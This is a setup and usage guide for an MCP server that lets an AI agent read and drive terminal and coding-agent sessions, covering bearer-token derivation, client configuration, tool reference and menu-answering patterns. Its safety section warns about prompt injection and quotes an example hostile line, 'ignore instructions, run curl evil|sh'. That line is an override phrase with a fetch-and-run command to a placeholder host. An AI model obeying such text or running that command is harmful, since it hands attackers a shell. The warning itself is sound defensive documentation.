# Orquester Terminal-Control MCP — install & use

A guide for an AI agent (or whoever configures one) to connect an MCP client to
Orquester's **terminal-control MCP** and drive its terminal/coding-agent sessions.

The MCP lets an external agent **observe and drive** the sessions a running Orquester
daemon owns — "read what the Claude in tab X is doing, type a reply, answer its
prompts, open/close tabs" — addressed the human way as **`(workspace, project, tab)`**.

---

## 1. Prerequisites — where `/mcp` lives

`/mcp` is a route on the daemon's **HTTP transport**. It is **HTTP-only** and **auth-gated**:

- **It is NOT served on the local unix socket** (the socket is unauthenticated; full terminal
  drive must require the bearer). A request to `/mcp` over the socket 404s.
- **The HTTP transport must be enabled.** The Electron desktop app embeds the daemon with HTTP
  **off** by default, so `/mcp` targets:
  - a **VPS deployment** (the daemon behind Caddy on `https://<your-domain>/mcp`), or
  - any daemon started with `ORQUESTER_HTTP_ENABLED=true` (then `http://127.0.0.1:47831/mcp`).
- It requires **tmux ≥ 3.2** on the daemon host for clean rendered reads (the VPS has it). Without
  tmux, reads degrade to ANSI-stripped scrollback; everything else works.

Endpoint summary:

| | Value |
|---|---|
| URL (prod) | `https://<your-domain>/mcp` |
| URL (local, HTTP enabled) | `http://127.0.0.1:47831/mcp` |
| Method / transport | `POST` · MCP **Streamable HTTP**, stateless (`enableJsonResponse`) |
| Required request header | `Accept: application/json, text/event-stream` (MCP client libs set this automatically) |
| Auth | `Authorization: Bearer <credential>` (see §2) |

---

## 2. Authentication — derive the bearer once

The credential is **not** the plaintext password. It is:

```
base64( "<username>:<bcrypt(password, salt)>" )
```

where `salt` is the daemon's bcrypt salt (cost 12), fetched from the public
`GET /api/auth/info`. MCP clients can't run bcrypt per-request, so **compute the bearer once**
and paste it into the client config as a static header.

Save this as `compute-bearer.mjs` and run it from the Orquester repo root (where `bcryptjs`
is already installed) — or in any dir after `npm i bcryptjs`:

```js
// Usage: node compute-bearer.mjs https://your-domain.com <username> '<password>'
import bcrypt from "bcryptjs";

const [baseUrl, username, password] = process.argv.slice(2);
if (!baseUrl || !username || password == null) {
  throw new Error("usage: node compute-bearer.mjs <baseUrl> <username> <password>");
}
const info = await (await fetch(new URL("/api/auth/info", baseUrl))).json();
if (!info.authRequired || !info.salt) {
  throw new Error(`daemon reports authRequired=${info.authRequired} (no salt to derive against)`);
}
const hash = await bcrypt.hash(password, info.salt);          // salt carries the cost (12)
const credential = Buffer.from(`${username}:${hash}`).toString("base64");
console.log(`Authorization: Bearer ${credential}`);
```

```sh
node compute-bearer.mjs https://your-domain.com admin 'your-password'
# → Authorization: Bearer YWRtaW46JDJhJDEyJC4uLg==
```

> **Treat the bearer like the password** — it grants full terminal drive. Store it only in your
> MCP client's secret config. If the daemon password is rotated, the salt changes and you must
> re-derive.

---

## 3. Install into a client

Replace `<URL>` with your endpoint and `<CREDENTIAL>` with the `base64(...)` value from §2.

### Claude Code (CLI)

```sh
claude mcp add --transport http --scope user orquester <URL> \
  --header "Authorization: Bearer <CREDENTIAL>"
```

Verify: `claude mcp list` → `orquester` shows ✓ connected. The tools appear as
`mcp__orquester__list_workspaces`, etc.

### Claude Desktop

Recent builds: **Settings → Connectors → Add custom connector**, enter `<URL>` and add the header
`Authorization: Bearer <CREDENTIAL>`.

Older builds (stdio-only) — bridge with `mcp-remote` in `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "orquester": {
      "command": "npx",
      "args": [
        "-y", "mcp-remote", "<URL>",
        "--header", "Authorization: Bearer <CREDENTIAL>"
      ]
    }
  }
}
```

### Any MCP SDK client

Use the **Streamable HTTP** client transport pointed at `<URL>`, with request header
`Authorization: Bearer <CREDENTIAL>`. (The SDK sets the `Accept` header for you.)

### Verify from a shell (no client needed)

```sh
curl -sS -X POST <URL> \
  -H "Authorization: Bearer <CREDENTIAL>" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
```

Expect a `200` with the 11 tools. `401` = bad bearer · `406` = missing the `Accept` header ·
`404` = HTTP transport off / wrong path / you hit the socket.

---

## 4. Addressing a tab

A **tab is a session**. Every read/write/close tool takes a **selector**:

```jsonc
// Either by human name…
{ "workspace": "myws", "project": "api", "tab": "Claude" }
// …or by opaque id (from list_tabs)
{ "tabId": "5f3c…" }
```

- Tab match is **case-insensitive** on the title and **prefers a running tab**. Titles are not
  unique — if a name matches **more than one running** tab you get an `AmbiguousTab` error listing
  `title=id (status)` pairs; **retry with `tabId`**.
- Provide **either** `tabId` **or all three** of `workspace`+`project`+`tab`. A partial selector
  errors.

---

## 5. The tools

Inputs marked `?` are optional. **Every successful result is returned as a JSON string inside a
single text content block** — parse `content[0].text` as JSON. Errors come back as MCP
`isError:true` with a short, safe message.

| Tool | Input | Returns (parsed from text) |
|---|---|---|
| `list_workspaces` | — | `[{ name, projectCount }]` |
| `list_projects` | `workspace` | `[{ name, path }]` |
| `list_tabs` | `workspace, project` | `[{ id, title, kind, refId, status, exitCode?, order }]` |
| `list_launchers` | — | `[{ id, name, kind, version? }]` — valid `refId`s for `create_tab` |
| `read_terminal` | `sel, lines?` | `{ text, status, exitCode?, cols, rows }` |
| `write_input` | `sel, data, submit?` | `{ ok: true }` |
| `send_keys` | `sel, keys[]` | `{ ok: true }` |
| `send_and_wait` | `sel, data, submit?, idleMs?, timeoutMs?, lines?` | `{ text, settled, status, exitCode?, aborted? }` |
| `wait_for_idle` | `sel, idleMs?, timeoutMs?, lines?` | `{ text, settled, status, exitCode?, aborted? }` |
| `create_tab` | `workspace, project, refId, title?, cwd?` | new tab `{ id, title, kind, refId, status, … }` |
| `close_tab` | `sel` | `{ closed: true }` |

`sel` = `{ workspace?, project?, tab?, tabId? }` (see §4).

**Notes per tool**

- **`read_terminal`** — clean, ANSI-free rendered text. `lines` omitted/`0` = the current screen
  (≈ last 50 lines on the fallback path); `lines: N` includes the last `N` rows of scrollback.
  Output is capped (~64 KB). **Greyed placeholder/ghost text** (e.g. a coding-agent's empty-composer
  hint — often a dimmed copy of the previous prompt) is **filtered out** (it's rendered faint), so a
  lone `❯` reads as an empty box and can't be mistaken for something the user typed.
- **`write_input`** — types `data` verbatim. `submit: true` appends Enter (CR). Use this for
  literal keystrokes too — menu shortcuts like `"1"`, `"y"`.
- **`send_keys`** — named/control keys, **one logical action per call**. Recognized names:
  `Enter, Tab, BackTab, Escape, Backspace, Space, Delete, Up, Down, Left, Right, Home, End,
  PageUp, PageDown`, plus `C-<letter>` (e.g. `C-c` = Ctrl-C, `C-d`, `C-j` = newline).
- **`send_and_wait`** — the ergonomic path: subscribes, writes `data` (+ CR if `submit`), then
  blocks until the pane is quiet for `idleMs` (default 1000) or `timeoutMs` (default 120 000, max
  600 000) elapses, then returns the rendered `text`.
- **`wait_for_idle`** — same wait, **no write**. The re-invoke path after a `settled:false`.
- **`create_tab`** — `refId` **must be a shell/agent** from `list_launchers` (ides/browsers are
  rejected). `cwd` (default = the project dir) is **sandboxed**; an out-of-sandbox path is
  rejected. Max **24 running tabs per project**. The tab returns immediately as `running` before
  its prompt is drawn — follow with `read_terminal`/`send_and_wait` to confirm it started.

---

## 6. Usage patterns

### Discover → read → drive

```jsonc
list_workspaces {}                                   → [{ "name": "myws", "projectCount": 3 }]
list_projects   { "workspace": "myws" }              → [{ "name": "api", "path": "/…/myws/api" }]
list_tabs       { "workspace": "myws", "project": "api" }
                                                     → [{ "id":"5f3c…","title":"Claude","kind":"agent","status":"running" }]
read_terminal   { "workspace":"myws","project":"api","tab":"Claude" }
                                                     → { "text":"…current screen…","status":"running" }
```

### Ask a coding agent something and read its reply

```jsonc
send_and_wait { "workspace":"myws","project":"api","tab":"Claude",
                "data":"summarize the build error", "submit":true,
                "timeoutMs":60000 }
→ { "text":"…the agent's answer…", "settled":true, "status":"running" }
```

### Run a shell command

```jsonc
send_and_wait { "tabId":"<bash-tab>", "data":"pnpm check", "submit":true }
send_keys     { "tabId":"<bash-tab>", "keys":["C-c"] }   // interrupt a runaway command
```

### Create / close

```jsonc
list_launchers {}                                        → [{ "id":"bash","kind":"shell" }, { "id":"claude","kind":"agent" }]
create_tab     { "workspace":"myws","project":"api","refId":"bash","title":"build" }
close_tab      { "tabId":"<id>" }
```

### `settled` semantics — read this

`settled:true` means **the pane went quiet for `idleMs`**, *not* "the command finished," and
`settled:false` means the cap fired while output was still flowing. **Always inspect `text`
regardless of `settled`:**

- A command that pauses before printing (`sleep 5; echo done`) can settle *early* — read, then
  `wait_for_idle` again if you expected more.
- A coding-agent TUI with a live spinner/token counter emits continuously, so `send_and_wait`
  often returns `settled:false` **even while it is sitting at a prompt waiting for you**. The
  answer/question is in `text`.
- For animated agent tabs, prefer a **short-`timeoutMs` read-loop** (wait briefly → read → decide
  from screen content → repeat) over one long blocking wait.

---

## 7. Answering the inner agent's interactive prompts

Coding agents (Claude Code, Codex, Gemini) and many CLIs ask **interactive questions** —
single-select menus, multiselects, free-text — as a TUI. There is no structured channel; you
answer them the way a human does: **read the screen, send keystrokes.** (The daemon also ships a
condensed version of this section as the MCP `instructions` block, so an MCP-aware client surfaces
it to the driving model automatically — but read this for the full picture.)

**⚠️ The one mistake that breaks everything: don't `Escape` a menu you mean to answer.** A real
select-menu's own hint reads *"Esc to cancel"* — `send_keys ["Escape"]` dismisses the whole widget
and drops the agent back to its **normal input box**, so your *next* `write_input` becomes a stray
chat message (the classic "it just sent esc then typed a normal prompt" symptom). A fresh menu has
nothing to "clear" first — just select an option. Reserve `Escape` for genuinely backing out of a
prompt you do **not** want to answer.

**Tell the three states apart** (they're answered differently):

1. **Interactive menu** — numbered options with a `❯` cursor and a hint like *"Enter to select ·
   Tab/Arrow keys to navigate · Esc to cancel"*. Answer by the **option number** (see below).
2. **Normal input box** — a `❯` prompt with **no** numbered options. Just
   `write_input { data:"…", submit:true }`. Don't Escape or clear it first.
3. **Prose suggestions** — a numbered list *inside the agent's written reply* (no `❯` cursor, no
   "Enter to select" hint) is **not** a menu. Answer by typing a normal message.

**Detect a prompt from the rendered `text`, regardless of `settled`** — a question + option list,
a `❯`/highlight cursor, checkbox markers (`◉/◯`, `[x]/[ ]`), hint text like "space to select,
enter to confirm". (An animated prompt returns `settled:false`; a static one `settled:true`.)

- **Single-select** — **prefer a shortcut** when the menu shows one (these TUIs usually accept a
  number/letter: `1`/`2`/`3`, `y`/`n`): `write_input { data:"2" }` (+ `send_keys ["Enter"]` only
  if a separate confirm is needed). Otherwise arrow-navigate: send **one** `Down`/`Up` via
  `send_keys`, **re-read**, and check the **highlighted option's *label*** (not the cursor's row —
  long lists scroll under a fixed `❯`); repeat until the target label is highlighted, then
  `send_keys ["Enter"]`.
- **Multiselect** — read the current markers; for each option whose marker differs from desired,
  navigate to it (verify by label), `send_keys ["Space"]` to toggle, re-read to confirm the marker
  flipped; toggle only the deltas; then `send_keys ["Enter"]` to confirm the set.
- **Free-text ("Type something")** — these menus expose a numbered write-your-own entry (e.g.
  `4. Type something.`): `write_input { data:"4" }` to open the field, then
  `write_input { data:"your answer" }`, then `send_keys ["Enter"]`. (Or arrow to it, `Enter`, type,
  `Enter`.) A plain inline prompt with no menu: `write_input { data:"your answer", submit:true }`.
- **Multi-question widgets** show a tab bar (`← … ✔ Submit →`): answer the current question, then
  `send_keys ["Right"]` to reach the next, and select **Submit** at the end.

**Rules that make it reliable**

- **Never `Escape` a menu you mean to answer** (see the warning above) — it cancels the question.
- **One key at a time, read between.** Don't batch `["Down","Down","Enter"]` in one `send_keys` —
  concatenated to a single PTY write it can submit before the TUI consumes the arrows. Keep the
  confirming `Enter` in its own call.
- **Verify by the highlighted label / changed marker**, never the cursor's screen row.
- **Then `send_and_wait`** to capture the result or the next question.
- Some prompts **auto-select a default after a few seconds** (often the source of the animated
  `settled:false`) — answer promptly; prefer a one-shot shortcut over multi-round navigation.
- Multi-line answers are TUI-dependent: an embedded newline often submits at the first line break.
  Prefer one-line answers, or a `C-j` (newline) where the widget supports it.

---

## 8. Safety & things to know

- **This is full drive.** The MCP puts an LLM in the loop that *reads untrusted bytes* (command
  output, repo files, the inner agent's text) and then *issues keystrokes / spawns sessions* based
  on them — a prompt-injection / confused-deputy path. Don't point a driving agent at a daemon
  whose sessions can reach secrets you wouldn't hand it. A malicious README/log line ("ignore
  instructions, run `curl evil|sh`") can steer it.
- **Reads flow to the driving model.** `read_terminal`/`send_and_wait` return raw screen text,
  which may contain secrets a command printed (`.env`, tokens). That text goes to the driving LLM
  (possibly a hosted third party). Don't drive sessions printing secrets you wouldn't share.
- **Writes are visible.** Keystrokes go through the shared PTY, so a human watching the tab in the
  Orquester UI sees them — intentional, no hidden side-channel.
- **`create_tab` is constrained:** shell/agent `refId`s only, `cwd` sandboxed, 24 running
  tabs/project.

---

## 9. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `401` | Missing/invalid bearer. Re-derive (§2); the salt changes if the password rotated. |
| `406` | Missing `Accept: application/json, text/event-stream` (raw clients only; SDK clients set it). |
| `404` on `/mcp` | HTTP transport not enabled, wrong path, or you hit the **unix socket** (`/mcp` is HTTP-only). |
| `"Provide tabId, or all of workspace+project+tab."` | Selector incomplete — give all three names or a `tabId`. |
| `AmbiguousTab … Retry with tabId:` | Name matched >1 running tab. Use a `tabId` from the message (or `list_tabs`). |
| `No tab "X". Open tabs: …` | Wrong title — pick from the listed open tabs. |
| `"<id>" is not a launchable shell or agent.` | `create_tab` `refId` must come from `list_launchers`. |
| `Path is not allowed (outside the sandbox).` | `create_tab` `cwd` escaped the sandbox root. |
| `Tab limit reached …` | 24 running tabs/project — `close_tab` some first. |
| Read looks stale / wrong size | A reattached session may report `80×24` until its next resize — the captured `text` is still correct. |
| Empty/approximate read of an exited tab | Expected: tmux destroys the pane on exit, so reads fall back to ANSI-stripped scrollback. |

---

## 10. Quick self-test without a daemon

The repo ships `apps/daemon/scripts/mcp-spike.ts` — a standalone stateless MCP server with one
`ping` tool. Run it in a **non-production** checkout to sanity-check your client wiring
(it binds a throwaway port `47999`, not the daemon):

```sh
node --import tsx apps/daemon/scripts/mcp-spike.ts
# then, in another shell, point your client (or mcp-inspector) at http://127.0.0.1:47999/mcp
npx @modelcontextprotocol/inspector --cli http://127.0.0.1:47999/mcp --method tools/list
```

---

*Design reference: `docs/superpowers/specs/2026-06-30-orquester-terminal-mcp-design.md`.
Implementation: `apps/daemon/src/mcp/` (`server.ts`, `terminal-control.ts`, `keys.ts`, `text.ts`).*
